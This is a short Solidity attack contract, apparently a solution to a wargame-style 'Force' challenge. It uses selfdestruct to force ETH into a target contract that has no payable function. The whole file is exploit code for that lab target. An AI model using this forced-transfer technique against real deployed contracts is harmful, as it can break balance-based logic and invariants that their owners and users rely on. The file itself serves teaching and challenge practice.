// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Since selfdestruct runs at EVM level, there are no ways
        // to prevent a contract from receiving ETH.
        selfdestruct(payable(contractAddress));
    }
}
